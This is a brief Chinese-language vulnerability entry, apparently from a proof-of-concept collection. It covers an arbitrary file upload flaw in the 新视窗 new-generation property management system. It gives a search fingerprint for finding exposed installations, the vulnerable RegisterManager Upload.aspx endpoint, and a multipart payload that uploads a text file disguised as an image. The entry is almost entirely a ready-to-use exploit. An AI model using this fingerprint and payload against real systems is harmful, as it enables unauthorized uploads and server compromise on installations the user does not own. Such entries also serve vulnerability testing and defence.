# 新视窗新一代物业管理系统RegisterManager存在任意文件上传漏洞

新视窗新一代物业管理系统 ｜ 文件上传 ｜ —
- **指纹**：`body="BPMSite/ClientSupport/OCXInstall.aspx"`
- **请求**：`POST /OfficeManagement/RegisterManager/Upload.aspx HTTP/1.1`

**Payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: image/jpg
123
--00content0boundary00--
```